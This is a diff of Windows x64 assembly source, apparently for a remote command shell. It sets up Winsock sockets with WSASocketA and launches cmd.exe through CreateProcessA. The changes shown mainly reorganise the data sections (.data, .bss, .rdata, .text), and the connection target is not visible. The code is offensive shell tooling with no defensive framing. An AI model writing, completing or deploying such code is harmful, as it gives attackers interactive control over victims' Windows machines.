@@ -1,10 +1,8 @@
 ;*************
 ;By: Teuzero *
 ;*************
-
 [BITS 64]
 global WinMain
-
 extern WaitForSingleObject
 extern WSAStartup
 extern htons
@@ -16,21 +14,13 @@ extern CreateThread
 extern WSASocketA
 extern WSACleanup
 
-section .data
+section .bss
     struc sockaddr_in
         .sin_family resw 1
         .sin_port resw 1
         .sin_addr resd 1
         .sin_zero resb 8
     endstruc
-
-    sock_addr istruc sockaddr_in
-        at sockaddr_in.sin_family, dw 0 
-        at sockaddr_in.sin_port, dw 0
-        at sockaddr_in.sin_addr, dd 0
-        at sockaddr_in.sin_zero, dd 0, 0
-    iend
-
     
     struc theProcess
         .cb resd 1
@@ -52,35 +42,22 @@ section .data
         .hStadOutput resd 2
         .hStdError resd 2
     endstruc
+    
+    wsaData                   resd 1
+    socket                    resd 1
+    space                     resq 1
 
-    startupinfoa istruc theProcess
-       at theProcess.cb, dd 0
-       at theProcess.lpReserved, db 0
-       at theProcess.lpDesktop, db 0
-       at theProcess.lpTitle, db 0
-       at theProcess.dwX, dd 0
-       at theProcess.dwY, dd 0
-       at theProcess.dwXSize, dd 0
-       at theProcess.dwYSize, dd 0
-       at theProcess.dwXCountChars, dd 0
-       at theProcess.dwYCountChars, dd 0
-       at theProcess.dwFillAttribute, dd 0
-       at theProcess.dwFlags, dd 0
-       at theProcess.wShowWindow, dw 0
-       at theProcess.cbReserved2, dw 0
-       at theProcess.lpReserverd2, db 0
-       at theProcess.hStdInput, dd 0
-       at theProcess.hStadOutput, dd 0
-       at theProcess.hStdError, dd 0
+
+section .rdata
+cmd db "cmd.exe",00h
+    
+section .data
+	startupinfoa istruc theProcess   
     iend
-
-    cmd db "cmd.exe",00h
-    wsaData                  dd 0
-    socket                   dd 0
-    space dd 0
-section .bss
-
-section .code
+	
+	sock_addr istruc sockaddr_in
+    iend
+section .text
 WinMain:
     Main:
         push rbp
@@ -163,4 +140,5 @@ WinMain:
             mov ecx, 0
             xor r10,r10
             call CreateProcessA
-            jmp WsaData 
+            jmp WsaData
+ret			
